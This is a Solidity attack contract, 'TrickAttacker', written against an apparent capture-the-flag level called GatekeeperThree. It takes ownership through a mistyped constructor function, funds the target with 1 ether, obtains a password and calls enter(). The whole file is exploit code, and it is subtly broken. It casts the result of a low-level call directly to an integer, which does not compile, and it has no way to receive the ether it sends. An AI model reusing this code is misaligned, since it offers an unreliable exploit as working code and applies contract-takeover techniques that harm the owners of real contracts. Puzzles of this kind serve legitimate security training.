pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256) external;
    function enter() external;
    function trick() external view returns (address);
}

contract TrickAttacker {
    IGatekeeperThree public target;

    constructor(address _target) {
        target = IGatekeeperThree(_target);
    }

    function createTrick() external {
        target.construct0r();
        (bool success, ) = payable(address(target)).call{value: 1e18}('');
        require(success, "Failed to send ether");
        target.createTrick();
    }

    function sendAllowance() external {
        address trickAddress = target.trick();
        uint256 trickPassword = uint256(uint160(payable(trickAddress).call(abi.encodeWithSignature("checkPassword()"))));
        target.getAllowance(trickPassword);
    }

    function enter() external {
        target.enter();
    }
}